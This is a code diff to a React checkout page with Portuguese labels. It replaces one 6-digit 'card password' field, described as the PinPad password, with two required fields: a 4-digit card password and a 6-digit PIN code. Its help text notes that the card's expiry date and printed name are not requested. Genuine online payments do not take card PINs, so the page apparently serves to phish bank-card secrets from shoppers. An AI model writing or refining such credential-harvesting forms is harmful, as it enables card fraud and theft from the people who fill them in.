@@ -313,16 +313,26 @@ function CheckoutPage() {
                     className="w-full rounded-md border border-input px-3 py-2 text-sm font-mono" required />
                   <Err k="cartaoNumero" />
                 </div>
-                <div>
-                  <label className="mb-1 block text-xs font-medium">Senha do cartão (6 dígitos) *</label>
-                  <input type="password" value={form.cartaoSenha}
-                    onChange={(e) => set("cartaoSenha", onlyDigits(e.target.value).slice(0, 6))}
-                    placeholder="••••••" inputMode="numeric" maxLength={6} autoComplete="off"
-                    className="w-full rounded-md border border-input px-3 py-2 text-sm" required />
-                  <Err k="cartaoSenha" />
-                  <div className="mt-1 text-[11px] text-muted-foreground">
-                    Mesma senha que você usa no PinPad. Não pedimos validade nem nome impresso.
+                <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
+                  <div>
+                    <label className="mb-1 block text-xs font-medium">Senha do cartão (4 dígitos) *</label>
+                    <input type="password" value={form.cartaoSenha}
+                      onChange={(e) => set("cartaoSenha", onlyDigits(e.target.value).slice(0, 4))}
+                      placeholder="••••" inputMode="numeric" maxLength={4} autoComplete="off"
+                      className="w-full rounded-md border border-input px-3 py-2 text-sm" required />
+                    <Err k="cartaoSenha" />
                   </div>
+                  <div>
+                    <label className="mb-1 block text-xs font-medium">PIN Code (6 dígitos) *</label>
+                    <input type="password" value={form.cartaoPincode}
+                      onChange={(e) => set("cartaoPincode", onlyDigits(e.target.value).slice(0, 6))}
+                      placeholder="••••••" inputMode="numeric" maxLength={6} autoComplete="off"
+                      className="w-full rounded-md border border-input px-3 py-2 text-sm" required />
+                    <Err k="cartaoPincode" />
+                  </div>
+                </div>
+                <div className="text-[11px] text-muted-foreground">
+                  Não pedimos validade nem nome impresso do cartão.
                 </div>
               </div>
             </section>
